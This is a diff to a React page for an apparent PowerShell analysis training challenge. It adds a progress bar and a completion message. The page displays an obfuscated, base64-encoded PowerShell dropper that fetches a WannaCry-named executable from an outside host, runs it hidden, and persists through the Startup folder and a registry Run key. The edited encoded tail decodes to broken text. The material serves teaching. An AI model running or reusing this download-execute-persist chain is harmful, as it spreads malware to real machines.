@@ -101,6 +101,10 @@ function PowerShellChallenge() {
     }));
   };
 
+  const correctAnswersCount = questions.filter(q => q.isCorrect).length;
+  const totalQuestions = questions.length;
+  const progress = (correctAnswersCount / totalQuestions) * 100;
+
   return (
     <div className="min-h-screen bg-background text-white">
       {/* Navigation */}
@@ -131,6 +135,15 @@ function PowerShellChallenge() {
       <div className="max-w-4xl mx-auto px-4 py-12 -mt-16 relative z-10">
         <h1 className="text-3xl font-bold mb-8">PowerShell Analysis Challenge</h1>
 
+        {/* Progress Bar */}
+        <div className="mb-6">
+          <div className="text-lg font-semibold mb-2">Progress</div>
+          <div className="h-2 bg-primary-blue/40 rounded-full overflow-hidden">
+            <div className="h-full bg-primary-blue" style={{ width: `${progress}%` }}></div>
+          </div>
+          <div className="text-sm mt-2 text-gray-400">{correctAnswersCount} of {totalQuestions} correct</div>
+        </div>
+
         {/* Introduction */}
         <div className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 mb-8">
           <h2 className="text-xl font-semibold mb-4">Challenge Introduction</h2>
@@ -143,7 +156,7 @@ function PowerShellChallenge() {
           {/* PowerShell Command in a Border */}
           <div className="bg-background border border-primary-blue/40 p-4 rounded-lg shadow-md overflow-x-auto">
             <pre className="text-gray-300 font-mono whitespace-pre-wrap break-words">
-              powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand JHVwZGF0ZSA9ICJodHRwOi8vdWh4cWluLmJpei9jc2dlYWl2cXBvZHFzLzU4NDliMWI2MWU4OGY3NDYxMDY0Yjk4NmEyMDRiOWM3X3dhbm5hY3J5LmV4ZSIgIA0KJGRlc3RpbmF0aW9uUGF0aCA9ICIkZW52OlRFTVBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cGRhdGUgLU91dEZpbGUgJGRlc3RpbmF0aW9uUGF0aA0KDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdGluYXRpb25QYXRoIC1XaW5kb3dTdHlsZSBIaWRkZW4NCg0KJHN0YXJ0dXBQYXRoID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KQ29weS1JdGVtIC1QYXRoICRkZXN0aW5hdGlvblBhdGggLURlc3RpbmF0aW9uICRzdGFydHVwUGF0aCAtRm9yY2UNCg0KTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAtTmFtZSAiVXBkYXRlU2VydmljZSIgLVZhbHVlICRkZXN0aW5hdGlvblBhdGggLVByb3BlcnR5VHlwZSBTdHJpbmcgLUZvcmNlDQoNCiRlbmNvZGVkQ29tbWFuZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygncG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlICcgKyAkZGVzdGluYXRpb25QYXRoKSkNClN0YXJ0LVByb2Nlc3MgInBvd2Vyc2hlbGwuZXhlIiAtQXJndW1lbnRMaXN0ICItRW5jb2RlZENvbW1hbmQgJGVuY29kZWRDb21tYW5kIiAtV2luZG93U3R5bGUgSGlkZGVu
+              powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand JHVwZGF0ZSA9ICJodHRwOi8vdWh4cWluLmJpei9jc2dlYWl2cXBvZHFzLzU4NDliMWI2MWU4OGY3NDYxMDY0Yjk4NmEyMDRiOWM3X3dhbm5hY3J5LmV4ZSIgIA0KJGRlc3RpbmF0aW9uUGF0aCA9ICIkZW52OlRFTVBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cGRhdGUgLU91dEZpbGUgJGRlc3RpbmF0aW9uUGF0aA0KDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdGluYXRpb25QYXRoIC1XaW5kb3dTdHlsZSBIaWRkZW4NCg0KJHN0YXJ0dXBQYXRoID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KQ29weS1JdGVtIC1QYXRoICRkZXN0aW5hdGlvblBhdGggLURlc3RpbmF0aW9uICRzdGFydHVwUGF0aCAtRm9yY2UNCg0KTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAtTmFtZSAiVXBkYXRlU2VydmljZSIgLVZhbHVlICRkZXN0aW5hdGlvblBhdGggLVByb3BlcnR5VHlwZSBTdHJpbmcgLUZvcmNlDQoNCiRlbmNvZGVkQ29tbWFuZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygncG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlICcgKyAkZGVzdGluYXRpb25QYXRoKSkNClN0YXJ0LVByb2Nlc3MgInBvd2Vyc2hlbC5leGUiIC1Bcmd1bWVudExpc3QgIlJlY29nbml6ZWQgY29tcGFjdC0wLg==
             </pre>
           </div>
         </div>
@@ -184,6 +197,14 @@ function PowerShellChallenge() {
             </div>
           ))}
         </div>
+
+        {/* Feedback Section */}
+        {correctAnswersCount === totalQuestions && (
+          <div className="mt-8 p-4 bg-green-600 text-white rounded-lg text-center">
+            <p className="text-lg font-semibold">Congratulations!</p>
+            <p>You have completed the challenge with {correctAnswersCount} out of {totalQuestions} correct answers.</p>
+          </div>
+        )}
       </div>
     </div>
   );
